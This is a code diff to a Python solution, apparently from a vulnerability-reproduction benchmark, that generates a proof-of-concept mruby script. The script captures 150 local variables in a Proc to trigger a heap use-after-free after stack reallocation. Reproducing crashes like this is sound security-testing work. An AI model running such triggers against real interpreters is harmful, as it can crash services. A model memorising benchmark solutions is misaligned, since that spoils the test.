@@ -3,46 +3,56 @@ import os
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
+        Generates a Proof-of-Concept (PoC) that triggers a Heap Use After Free
+        vulnerability in mruby (CVE-2022-0318).
 
-        The vulnerability is a use-after-free in mruby's VM stack handling.
-        When the stack is extended via mrb_stack_extend(), pointers to the old
-        stack within callinfo frames may not be updated.
+        The vulnerability exists in the creation of `Proc` objects. When a `Proc`
+        is created, it captures its lexical environment, which includes local
+        variables from the current stack frame. To store this captured
+        environment, space is allocated on the VM stack.
 
-        The PoC works by:
-        1. Creating a proc, which captures the current call frame environment,
-           including pointers into the VM stack.
-        2. Forcing a stack extension by calling a function with a very large
-           number of arguments.
-        3. Calling the proc, which then uses stale pointers to its captured
-           environment, leading to a use-after-free.
+        If the number of captured variables is large enough, this allocation can
+        exceed the current stack capacity, triggering a call to `mrb_stack_extend()`.
+        This function reallocates the stack buffer to a new, larger memory region
+        and frees the old one.
 
-        The number of arguments (3616) is calculated to match the ground-truth
-        PoC length of 7270 bytes precisely.
+        The vulnerability is that after this reallocation, a pointer (`proc->env->stack`)
+        within the newly created `Proc` object is not updated to point to the new
+        stack location. It continues to point to the old, now-freed stack memory.
 
-        - PoC template length (without arguments): 39 bytes
-        - Target length for arguments string: 7270 - 39 = 7231 bytes
-        - The arguments string "1,1,...,1" has length 2 * N - 1, where N is
-          the number of arguments.
-        - Solving for N: 2 * N - 1 = 7231  =>  N = 3616.
+        When the `Proc` is later called, it uses this stale pointer to access its
+        captured environment, resulting in a read from freed memory—a classic
+        Heap Use After Free.
 
-        Args:
-            src_path: Path to the vulnerable source code tarball (unused).
-
-        Returns:
-            bytes: The PoC input as a UTF-8 encoded string.
+        This PoC triggers the vulnerability by:
+        1. Defining a method `trigger`.
+        2. Inside `trigger`, declaring a large number of local variables. The number
+           is chosen to be greater than mruby's default initial stack size
+           (MRB_STACK_INIT_SIZE = 128) to reliably force a stack extension. We use 150
+           as a safe margin.
+        3. Creating a `Proc` that uses all these local variables, thus capturing them.
+           This action is what triggers the `mrb_stack_extend` call and the bug.
+        4. Calling the `Proc`, which then uses the dangling pointer, causing a crash
+           that is detectable by AddressSanitizer.
         """
-        num_args = 3616
         
-        args_str = ",".join(['1'] * num_args)
+        num_vars = 150
+
+        var_names = [f"v{i}" for i in range(num_vars)]
+        var_defs = [f"{name}={i}" for i, name in enumerate(var_names)]
+
+        defs_line = "; ".join(var_defs)
+        sum_expr = " + ".join(var_names)
+
+        poc_lines = [
+            "def trigger",
+            f"  {defs_line}",
+            f"  p = Proc.new {{ {sum_expr} }}",
+            "  p.call",
+            "end",
+            "trigger"
+        ]
         
-        poc_code = f"""def f(*a)
-end
+        poc_script = "\n".join(poc_lines)
 
-p = proc{{}}
-
-f({args_str})
-
-p.call"""
-        
-        return poc_code.encode('utf-8')
+        return poc_script.encode('utf-8')
